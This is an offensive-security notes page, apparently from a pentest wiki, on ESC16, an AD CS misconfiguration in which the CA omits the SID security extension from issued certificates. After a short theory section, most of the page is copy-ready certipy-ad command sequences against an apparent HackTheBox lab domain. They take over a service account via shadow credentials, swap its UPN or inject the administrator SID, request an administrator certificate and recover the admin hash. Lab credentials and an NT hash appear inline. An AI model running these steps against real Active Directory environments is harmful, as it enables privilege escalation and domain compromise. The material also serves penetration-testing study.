---
description: Security Extension Disabled on CA (Globally)
---

# ESC16

The difference between ESC16 and ESC9 is important: ESC16 is a misconfiguration at the **Certificate Authority** level, so all certificates issued by that CA can be affected. ESC9 is a vulnerable **certificate template**, so only certificates based on that template are at risk

### Theory

ESC16 refers to a configuration flaw in Active Directory Certificate Services (AD CS) where the Certificate Authority (CA) is set to omit the `szOID_NTDS_CA_SECURITY_EXT` extension (OID: `1.3.6.1.4.1.311.25.2`) from all issued certificates. This extension, introduced in recent Windows updates, plays a crucial role in securely binding certificates to user or computer accounts through their unique Security Identifiers (SIDs).

When configured this way, the CA issues certificates without embedding the SID-based security extension. As a result, all templates published by this CA behave as though they explicitly disable the use of secure SID mappings, significantly weakening certificate-based authentication.

If Domain Controllers are not enforcing strict certificate mapping — specifically, if the `StrongCertificateBindingEnforcement` registry value is not set to `2` (Full Enforcement mode)—they fall back to older, less secure mapping techniques. These methods often rely on values like the User Principal Name (UPN) or DNS name found in the Subject Alternative Name (SAN) field of the certificate.

### Requirements

ESC16 abuse requirements :

* Disabled extensions ⇒ 1.3.6.1.4.1.311.25.2

### Detect

```shellscript
# Enumerate all vulnerable templates
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -stdout -enabled -vulnerable
certipy-ad find -u '<USER>@<DOMAIN>' -hashes :<NT_HASH> -dc-ip <DC_IP> -stdout -enabled -vulnerable   
```

### Exploit

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FJTIsC2v4UJLnBdHCj2z5%2Fimage.png?alt=media&#x26;token=c8c85c22-fa3e-4bc1-81b4-8a789cf058ba" alt=""><figcaption></figcaption></figure>

#### Scenario 1 : Compatibility mode

**Requirements**

{% hint style="danger" %}
* `StrongCertificateBindingEnforcement` is set to `0` or `1`. This will cause the KDC to check only the UPN of the SAN included in the certificate request
* We must have a user A who has write permissions (`GenrericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`) over a user B UPN
{% endhint %}

```shellscript
# Use the GenericWrite permissions to get the hashes of the user ca_svc
certipy-ad shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "ca_svc" -ns 10.10.11.69

# Use ca_svc to find vulnerable templates
certipy-ad find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout -enabled -vulnerable 

# Change the UPN of the account ca_svc to match the administrator's one
certipy-ad account -u p.agila@fluffy.htb -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn administrator -user ca_svc update 

# Request a certificate with ca_svc. We use the default template User
certipy-ad req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User -upn administrator@fluffy.htb 

# Revert the UPN changes for the target account to avoid authentication issues 
certipy-ad account -u p.agila@fluffy.htb -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn ca_svc -user ca_svc update 

# Use the certificate to authenticate and get the administrator's hash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.69 -domain fluffy.htb 
```

#### Scenario 2 : Full enforcement

`StrongCertificateBindingEnforcement` attribute is set to `2`, meaning the KDC will verify the SID present in the certificate's security extension. If the CA is vulnerable to ESC6, the SID can be manipulated directly in the SAN field of the certificate request, bypassing the enforcement policy

**Requirements**

{% hint style="danger" %}
* User specified SAN : enabled (ESC6)
* `StrongCertificateBindingEnforcement` attribute is set to `2`
{% endhint %}

```shellscript
# Use the GenericWrite permissions to get the hashes of the user ca_svc
certipy-ad shadow auto -u "p.agila"@"fluffy.htb" -p "prometheusx-303" -account "ca_svc" -ns 10.10.11.69

# Use ca_svc to find vulnerable templates
certipy-ad find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout -enabled -vulnerable 

# Get the administrator's SID (from powershell)
(Get-LocalUser -Name Administrator).SID.Value

# Request a certificate with ca_svc using the default template User. We have to pass the
# admin UPN and SID in the certificate request as we don't change any account UPN
certipy-ad req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User -upn administrator@fluffy.htb -sid 'S-1-5-21-497550768-2797716248-2627064577-500' 

# Use the certificate to authenticate and get the administrator's hash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.69 -domain fluffy.htb 
```
